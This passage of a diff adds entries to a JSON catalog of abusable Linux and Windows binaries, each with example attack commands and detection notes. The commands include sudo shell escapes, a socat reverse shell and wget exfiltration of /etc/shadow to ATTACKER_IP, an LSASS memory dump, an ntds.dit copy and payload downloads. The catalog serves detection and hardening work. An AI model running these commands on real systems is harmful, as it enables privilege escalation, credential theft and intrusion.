+    ]
+  },
+  {
+    "id": "pip",
+    "name": "pip",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "pip can run arbitrary code from a malicious setup.py during install; abusable when run via sudo.",
+    "example_command": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\",\"-c\",\"sh <$(tty) >$(tty) 2>$(tty)\")' > $TF/setup.py; sudo pip install $TF",
+    "alt_commands": [],
+    "detection_notes": "Alert on sudo pip install from local temp directories; treat arbitrary setup.py execution as code execution.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/pip/"
+    ]
+  },
+  {
+    "id": "psql",
+    "name": "psql",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "The PostgreSQL client can shell out via '\\!'; abusable when run via sudo.",
+    "example_command": "sudo psql -c '\\! /bin/sh'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/psql/"
+    ]
+  },
+  {
+    "id": "python",
+    "name": "python",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Python can spawn shells via os.system/os.execl; abusable when SUID or run via sudo.",
+    "example_command": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+    "alt_commands": [
+      "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'   # with SUID + setuid support"
+    ],
+    "detection_notes": "Alert on python/python3 run via sudo importing os and calling system/exec/setuid.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/python/"
+    ]
+  },
+  {
+    "id": "python3",
+    "name": "python3",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Python 3 can spawn shells via os.system/os.execl; abusable when SUID or run via sudo.",
+    "example_command": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/python/"
+    ]
+  },
+  {
+    "id": "rsync",
+    "name": "rsync",
+    "os": "linux",
+    "category": "Shell / File Transfer",
+    "description": "rsync can run a helper program via -e/--rsh; abusable under SUID/sudo for a shell.",
+    "example_command": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/rsync/"
+    ]
+  },
+  {
+    "id": "ruby",
+    "name": "ruby",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Ruby can execute commands via exec/system; abusable when SUID or run via sudo.",
+    "example_command": "sudo ruby -e 'exec \"/bin/sh\"'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ruby/"
+    ]
+  },
+  {
+    "id": "rvim",
+    "name": "rvim",
+    "os": "linux",
+    "category": "Shell / File Read-Write",
+    "description": "Restricted vim can still run embedded Python/Lua to spawn shells; abusable under SUID/sudo.",
+    "example_command": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh\")'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/rvim/"
+    ]
+  },
+  {
+    "id": "scp",
+    "name": "scp",
+    "os": "linux",
+    "category": "File Transfer / Shell",
+    "description": "Secure copy can run a program via its ProxyCommand/-S option; abusable under sudo for a shell.",
+    "example_command": "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/scp/"
+    ]
+  },
+  {
+    "id": "screen",
+    "name": "screen",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "screen can spawn shells and, historically (SUID), was abusable for local root; a shell launcher under sudo.",
+    "example_command": "sudo screen\n# then Ctrl-a c to open a shell",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/screen/"
+    ]
+  },
+  {
+    "id": "sed",
+    "name": "sed",
+    "os": "linux",
+    "category": "Shell / File Read-Write",
+    "description": "GNU sed can run commands via the 'e' command and read/write files; abusable under sudo/SUID.",
+    "example_command": "sudo sed -n '1e exec /bin/sh 1>&0' /etc/hosts",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/sed/"
+    ]
+  },
+  {
+    "id": "service",
+    "name": "service",
+    "os": "linux",
+    "category": "Privilege Escalation",
+    "description": "service runs init scripts; under sudo it can execute an attacker-controlled service script as root.",
+    "example_command": "sudo service ../../../tmp/evil",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/service/"
+    ]
+  },
+  {
+    "id": "setarch",
+    "name": "setarch",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "setarch runs a program in a changed personality — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo setarch $(uname -m) /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/setarch/"
+    ]
+  },
+  {
+    "id": "sh",
+    "name": "sh",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "The POSIX shell yields a privileged shell when SUID or allowed via sudo.",
+    "example_command": "sudo sh",
+    "alt_commands": [
+      "sh -p   # when the SUID bit is set"
+    ],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/sh/"
+    ]
+  },
+  {
+    "id": "socat",
+    "name": "socat",
+    "os": "linux",
+    "category": "Reverse Shell / Shell",
+    "description": "Multipurpose relay abusable for reverse/bind shells and file transfer; a privileged shell under sudo.",
+    "example_command": "socat TCP:ATTACKER_IP:4444 EXEC:/bin/sh",
+    "alt_commands": [
+      "socat FILE:`tty`,raw,echo=0 TCP-L:4444   # listener side of an interactive reverse shell",
+      "sudo socat stdin exec:/bin/sh"
+    ],
+    "detection_notes": "Alert on socat with EXEC:/SYSTEM: to a shell, or connecting outbound to non-standard ports. Rare on most hosts.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/socat/"
+    ]
+  },
+  {
+    "id": "sqlite3",
+    "name": "sqlite3",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "sqlite3 can run shell commands via '.shell'/'.system'; abusable when SUID or run via sudo.",
+    "example_command": "sudo sqlite3 /dev/null '.shell /bin/sh'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/sqlite3/"
+    ]
+  },
+  {
+    "id": "ssh",
+    "name": "ssh",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "ssh can run a local ProxyCommand and supports options that shell out; abusable under sudo.",
+    "example_command": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/ssh/"
+    ]
+  },
+  {
+    "id": "stdbuf",
+    "name": "stdbuf",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "stdbuf runs a program with altered buffering — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo stdbuf -i0 /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/stdbuf/"
+    ]
+  },
+  {
+    "id": "strace",
+    "name": "strace",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "strace can run a target program; a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo strace -o /dev/null /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/strace/"
+    ]
+  },
+  {
+    "id": "systemctl",
+    "name": "systemctl",
+    "os": "linux",
+    "category": "Privilege Escalation / Persistence",
+    "description": "systemctl can install and start a unit running an arbitrary command; abusable under sudo for root execution.",
+    "example_command": "TF=$(mktemp).service; echo -e '[Service]\\nExecStart=/bin/sh -c \"id > /tmp/o\"\\n[Install]\\nWantedBy=multi-user.target' > $TF; sudo systemctl link $TF; sudo systemctl enable --now $TF",
+    "alt_commands": [
+      "sudo systemctl\n!sh   # via the pager"
+    ],
+    "detection_notes": "Alert on sudo systemctl link/enable of units in temp/user paths, or pager shell escapes from systemctl.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/systemctl/"
+    ]
+  },
+  {
+    "id": "tar",
+    "name": "tar",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "GNU tar can run commands via checkpoint actions; abusable when SUID or run via sudo.",
+    "example_command": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Alert on tar with --checkpoint-action=exec, especially under sudo. Watch for the wildcard-injection variant on cron backups.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/tar/"
+    ]
+  },
+  {
+    "id": "taskset",
+    "name": "taskset",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "taskset runs a program with a CPU affinity — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo taskset 1 /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/taskset/"
+    ]
+  },
+  {
+    "id": "tcpdump",
+    "name": "tcpdump",
+    "os": "linux",
+    "category": "Privilege Escalation",
+    "description": "tcpdump's -z postrotate command runs an arbitrary script as its (often root) user.",
+    "example_command": "COMMAND='id'; TF=$(mktemp); echo \"$COMMAND\" > $TF; chmod +x $TF; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root",
+    "alt_commands": [],
+    "detection_notes": "Alert on tcpdump run via sudo with -z pointing at a temp script; capture capability grants root-equivalent code exec.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/tcpdump/"
+    ]
+  },
+  {
+    "id": "tee",
+    "name": "tee",
+    "os": "linux",
+    "category": "File Write",
+    "description": "tee writes stdin to files; under SUID/sudo it can create or append to privileged files.",
+    "example_command": "echo 'root2::0:0:::/bin/sh' | sudo tee -a /etc/passwd",
+    "alt_commands": [],
+    "detection_notes": "Alert on tee run via sudo writing to system config files.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/tee/"
+    ]
+  },
+  {
+    "id": "timeout",
+    "name": "timeout",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "timeout runs a command with a time limit — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo timeout 7d /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/timeout/"
+    ]
+  },
+  {
+    "id": "tmux",
+    "name": "tmux",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "tmux spawns interactive shells; abusable when SUID or run via sudo.",
+    "example_command": "sudo tmux",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/tmux/"
+    ]
+  },
+  {
+    "id": "vi",
+    "name": "vi",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "The classic vi editor can shell out via ':!', abusable when SUID or run via sudo.",
+    "example_command": "sudo vi -c ':!/bin/sh'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/vi/"
+    ]
+  },
+  {
+    "id": "vigr",
+    "name": "vigr",
+    "os": "linux",
+    "category": "File Write / Privilege Escalation",
+    "description": "vigr edits /etc/group with an editor that can shell out; abusable when run via sudo.",
+    "example_command": "sudo vigr",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/vigr/"
+    ]
+  },
+  {
+    "id": "vim",
+    "name": "vim",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation / File Read-Write",
+    "description": "Vim can spawn shells and read/write arbitrary files; dangerous when SUID or run via sudo.",
+    "example_command": "sudo vim -c ':!/bin/sh'",
+    "alt_commands": [
+      "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh\")'",
+      "vim -c ':set shell=/bin/sh|shell'"
+    ],
+    "detection_notes": "Alert on vim/vi launched via sudo or SUID spawning /bin/sh, or using :! / :py / :lua shell escapes.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/vim/"
+    ]
+  },
+  {
+    "id": "watch",
+    "name": "watch",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "watch periodically runs a command — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/watch/"
+    ]
+  },
+  {
+    "id": "wget",
+    "name": "wget",
+    "os": "linux",
+    "category": "Download / File Write",
+    "description": "Downloads files; under sudo can overwrite privileged files (e.g. /etc/passwd) or fetch payloads.",
+    "example_command": "wget http://ATTACKER_IP/payload -O /tmp/payload",
+    "alt_commands": [
+      "sudo wget http://ATTACKER_IP/passwd -O /etc/passwd   # overwrite privileged file",
+      "wget --post-file=/etc/shadow http://ATTACKER_IP/   # exfiltrate a file"
+    ],
+    "detection_notes": "Alert on wget run via sudo writing to system paths, --post-file exfiltration, or downloads to temp/executable paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/wget/"
+    ]
+  },
+  {
+    "id": "xargs",
+    "name": "xargs",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "xargs executes a command from stdin arguments — a shell launcher abusable under SUID/sudo.",
+    "example_command": "sudo xargs -a /dev/null /bin/sh",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/xargs/"
+    ]
+  },
+  {
+    "id": "xxd",
+    "name": "xxd",
+    "os": "linux",
+    "category": "File Read-Write",
+    "description": "xxd can hexdump and reverse files; under SUID/sudo it reads or writes privileged files.",
+    "example_command": "sudo xxd /etc/shadow | xxd -r",
+    "alt_commands": [],
+    "detection_notes": "Alert on xxd run via sudo against sensitive files.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/xxd/"
+    ]
+  },
+  {
+    "id": "zip",
+    "name": "zip",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "zip can execute a command via its --unzip-command test option; abusable when SUID or via sudo.",
+    "example_command": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'",
+    "alt_commands": [],
+    "detection_notes": "Review sudoers for unrestricted NOPASSWD entries. Alert on this binary being run via sudo and then spawning /bin/sh, /bin/bash, or writing to sensitive paths.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/zip/"
+    ]
+  },
+  {
+    "id": "zsh",
+    "name": "zsh",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "Z shell yields a privileged shell when SUID or allowed via sudo.",
+    "example_command": "sudo zsh",
+    "alt_commands": [],
+    "detection_notes": "Audit SUID/SGID binaries regularly (find / -perm -4000 -type f). Alert on this binary spawning a shell or reading/writing files outside its normal role, especially with euid=0.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/zsh/"
+    ]
+  },
+  {
+    "id": "advpack",
+    "name": "advpack.dll",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": "Advanced INF installer library abused (via rundll32) to run INF sections, including remote scriptlets.",
+    "example_command": "rundll32.exe advpack.dll,LaunchINFSection C:\\temp\\payload.inf,DefaultInstall_SingleUser,1,",
+    "alt_commands": [
+      "rundll32.exe advpack.dll,RegisterOCX payload.dll"
+    ],
+    "detection_notes": "Flag rundll32 loading advpack.dll with LaunchINFSection/RegisterOCX against user-writable INF/DLL paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Libraries/Advpack/"
+    ]
+  },
+  {
+    "id": "atbroker",
+    "name": "atbroker.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Assistive Technology broker abusable to start a registered (attacker-defined) accessibility application.",
+    "example_command": "atbroker.exe /start malware",
+    "alt_commands": [],
+    "detection_notes": "Flag atbroker.exe /start referencing non-default AT registrations; correlate with new HKLM AT registry keys.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
+    ]
+  },
+  {
+    "id": "bitsadmin",
+    "name": "bitsadmin.exe",
+    "os": "windows",
+    "category": "Download / Execution / Persistence",
+    "description": "BITS admin tool abusable to download files and to run commands via job completion notifications.",
+    "example_command": "bitsadmin /transfer job /download /priority high http://example.com/payload.exe C:\\temp\\payload.exe",
+    "alt_commands": [
+      "bitsadmin /create job & bitsadmin /addfile job http://example.com/p.exe C:\\temp\\p.exe & bitsadmin /SetNotifyCmdLine job cmd.exe \"/c calc.exe\" & bitsadmin /resume job"
+    ],
+    "detection_notes": "Monitor bitsadmin.exe with /transfer or /SetNotifyCmdLine. Inspect BITS-Client operational log for jobs created by unusual processes.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+    ]
+  },
+  {
+    "id": "certreq",
+    "name": "certreq.exe",
+    "os": "windows",
+    "category": "Download / Exfiltration",
+    "description": "Certificate request utility abusable to download files and to POST/upload local file contents to a remote server.",
+    "example_command": "certreq.exe -Post -config http://example.com/ C:\\temp\\secret.txt output.txt",
+    "alt_commands": [],
+    "detection_notes": "Flag certreq.exe with -Post to http(s) endpoints, especially uploading local files.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Certreq/"
+    ]
+  },
+  {
+    "id": "certutil",
+    "name": "certutil.exe",
+    "os": "windows",
+    "category": "Download / Decode",
+    "description": "Native Windows certificate utility abusable for downloading files or decoding/encoding base64 payloads.",
+    "example_command": "certutil -urlcache -split -f http://example.com/payload.exe payload.exe",
+    "alt_commands": [
+      "certutil -decode encoded.txt decoded.exe",
+      "certutil -encode payload.exe encoded.txt",
+      "certutil.exe -verifyctl -f -split http://example.com/payload.exe"
+    ],
+    "detection_notes": "Alert on certutil.exe with '-urlcache', '-verifyctl', '-decode', or '-encode' flags, especially with outbound network connections. Sigma: process_creation Image endswith certutil.exe AND CommandLine contains 'urlcache'/'decode'.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+    ]
+  },
+  {
+    "id": "cmstp",
+    "name": "cmstp.exe",
+    "os": "windows",
+    "category": "Execution / UAC Bypass / AWL Bypass",
+    "description": "Connection Manager Profile Installer abusable to run arbitrary commands via a malicious INF, bypassing AppLocker and UAC.",
+    "example_command": "cmstp.exe /ni /s C:\\temp\\payload.inf",
+    "alt_commands": [],
+    "detection_notes": "Alert on cmstp.exe execution with INF files from user-writable paths, and cmstp.exe spawning scripting hosts. Very rare in normal use.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Cmstp/"
+    ]
+  },
+  {
+    "id": "comsvcs",
+    "name": "comsvcs.dll",
+    "os": "windows",
+    "category": "Credential Access",
+    "description": "COM+ services DLL whose MiniDump export is abused (via rundll32) to dump LSASS memory for credential theft.",
+    "example_command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full",
+    "alt_commands": [
+      "rundll32.exe comsvcs.dll MiniDump <lsass_pid> C:\\temp\\lsass.dmp full"
+    ],
+    "detection_notes": "High-fidelity: alert on rundll32 loading comsvcs.dll with 'MiniDump', and on any non-analytic handle to lsass.exe with PROCESS_VM_READ.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/"
+    ]
+  },
+  {
+    "id": "control",
+    "name": "control.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Control Panel launcher abusable to execute malicious Control Panel applets (.cpl / DLLs).",
+    "example_command": "control.exe C:\\temp\\payload.cpl",
+    "alt_commands": [],
+    "detection_notes": "Flag control.exe loading .cpl/DLLs from temp/user paths; correlate with rundll32 shell32 Control_RunDLL.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Control/"
+    ]
+  },
+  {
+    "id": "cscript",
+    "name": "cscript.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Console Windows Script Host used to run VBScript/JScript (.vbs/.js), commonly abused by malware loaders.",
+    "example_command": "cscript.exe //nologo C:\\temp\\payload.vbs",
+    "alt_commands": [
+      "cscript /e:jscript C:\\temp\\payload.txt"
+    ],
+    "detection_notes": "Monitor cscript.exe running scripts from temp/Downloads or spawning powershell.exe/cmd.exe; consider disabling WSH where unused.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cscript/"
+    ]
+  },
+  {
+    "id": "curl-win",
+    "name": "curl.exe",
+    "os": "windows",
+    "category": "Download / Exfiltration",
+    "description": "Built-in curl (Win10 1803+) abusable to download payloads and exfiltrate files.",
+    "example_command": "curl.exe -o C:\\temp\\payload.exe http://example.com/payload.exe",
+    "alt_commands": [
+      "curl.exe -T C:\\temp\\secret.txt http://example.com/upload"
+    ],
+    "detection_notes": "Flag curl.exe writing executables or uploading (-T) to external hosts, especially from temp paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Curl/"
+    ]
+  },
+  {
+    "id": "desktopimgdownldr",
+    "name": "desktopimgdownldr.exe",
+    "os": "windows",
+    "category": "Download",
+    "description": "Lock-screen image downloader abusable to fetch arbitrary files from a URL to disk.",
+    "example_command": "set \"SystemRoot=C:\\temp\" && desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr",
+    "alt_commands": [],
+    "detection_notes": "Flag desktopimgdownldr.exe with /lockscreenurl to non-Microsoft hosts or a redirected SystemRoot.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/"
+    ]
+  },
+  {
+    "id": "diantz",
+    "name": "diantz.exe",
+    "os": "windows",
+    "category": "Download / Archive",
+    "description": "Cabinet-making tool abusable to compress and copy files from remote UNC/WebDAV paths into a local CAB.",
+    "example_command": "diantz.exe \\\\attacker\\share\\payload.exe C:\\temp\\payload.cab",
+    "alt_commands": [],
+    "detection_notes": "Flag diantz.exe reading from UNC/WebDAV paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Diantz/"
+    ]
+  },
+  {
+    "id": "dnscmd",
+    "name": "dnscmd.exe",
+    "os": "windows",
+    "category": "Execution / Lateral Movement",
+    "description": "DNS server admin tool; abusable on DNS servers to load a malicious plugin DLL (ServerLevelPluginDll) for code execution as SYSTEM.",
+    "example_command": "dnscmd.exe DNS-SERVER /config /serverlevelplugindll \\\\attacker\\share\\payload.dll",
+    "alt_commands": [],
+    "detection_notes": "Alert on dnscmd.exe setting serverlevelplugindll, and monitor HKLM\\SYSTEM\\...\\DNS\\Parameters\\ServerLevelPluginDll.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/"
+    ]
+  },
+  {
+    "id": "esentutl",
+    "name": "esentutl.exe",
+    "os": "windows",
+    "category": "Download / Copy / Credential Access",
+    "description": "ESE database utility abusable to copy locked files (e.g. ntds.dit, SAM) and to download files over WebDAV.",
+    "example_command": "esentutl.exe /y \\\\attacker\\share\\payload.exe /d C:\\temp\\payload.exe /o",
+    "alt_commands": [
+      "esentutl.exe /y C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\ntds.dit /vss"
+    ],
+    "detection_notes": "Flag esentutl.exe with /y copying from UNC/WebDAV, or accessing ntds.dit/SAM/SYSTEM hives.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Esentutl/"
+    ]
+  },
+  {
+    "id": "expand",
+    "name": "expand.exe",
+    "os": "windows",
+    "category": "Download / Copy",
+    "description": "Cabinet expansion utility abusable to copy/stage files, including from UNC/WebDAV paths.",
+    "example_command": "expand.exe \\\\attacker\\share\\payload.exe C:\\temp\\payload.exe",
+    "alt_commands": [
+      "expand.exe C:\\temp\\payload.cab -F:* C:\\temp\\out"
+    ],
+    "detection_notes": "Flag expand.exe copying from UNC/WebDAV to user-writable paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Expand/"
+    ]
+  },
+  {
+    "id": "extrac32",
+    "name": "extrac32.exe",
+    "os": "windows",
+    "category": "Download / Copy",
+    "description": "CAB extraction tool abusable to copy files (including over UNC/WebDAV) and stage payloads.",
+    "example_command": "extrac32.exe /Y /C \\\\attacker\\share\\payload.exe C:\\temp\\payload.exe",
+    "alt_commands": [],
+    "detection_notes": "Flag extrac32.exe copying from UNC paths or extracting to user-writable directories.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Extrac32/"
+    ]
+  },
+  {
+    "id": "findstr",
+    "name": "findstr.exe",
+    "os": "windows",
+    "category": "Download / Credential Access",
+    "description": "String-search tool abusable to download files over UNC/WebDAV and to search shares for secrets (e.g. GPP passwords).",
+    "example_command": "findstr /V /L W3AllLov3DetopKlk \\\\attacker\\share\\payload.exe > C:\\temp\\payload.exe",
+    "alt_commands": [
+      "findstr /S /I cpassword \\\\domain\\sysvol\\*.xml"
+    ],
+    "detection_notes": "Flag findstr reading from UNC paths to write local files, or recursive searches for 'cpassword'/'password' across shares.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Findstr/"
+    ]
+  },
+  {
+    "id": "finger",
+    "name": "finger.exe",
+    "os": "windows",
+    "category": "Download / Exfiltration / C2",
+    "description": "Finger client abusable as a download/exfil channel and covert C2 over TCP/79.",
+    "example_command": "finger user@example.com | more +2 > C:\\temp\\payload.bat",
+    "alt_commands": [],
+    "detection_notes": "Flag any finger.exe usage; outbound TCP/79 to external hosts is rare and suspicious.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Finger/"
+    ]
+  },
+  {
+    "id": "forfiles",
+    "name": "forfiles.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Selects files and runs a command against each; abusable to launch arbitrary processes and evade parent-process-based detections.",
+    "example_command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c calc.exe\"",
+    "alt_commands": [],
+    "detection_notes": "Flag forfiles.exe with /c invoking cmd/powershell; unusual as an execution parent.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/"
+    ]
+  },
+  {
+    "id": "ftp-win",
+    "name": "ftp.exe",
+    "os": "windows",
+    "category": "Download / Execution",
+    "description": "FTP client abusable to download files and to execute local commands via '!' script directives.",
+    "example_command": "echo !cmd /c calc.exe > ftp.txt & ftp -s:ftp.txt",
+    "alt_commands": [],
+    "detection_notes": "Flag ftp.exe with -s: script files, especially containing '!' shell escapes, or spawning cmd/powershell.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Ftp/"
+    ]
+  },
+  {
+    "id": "gpscript",
+    "name": "gpscript.exe",
+    "os": "windows",
+    "category": "Execution",
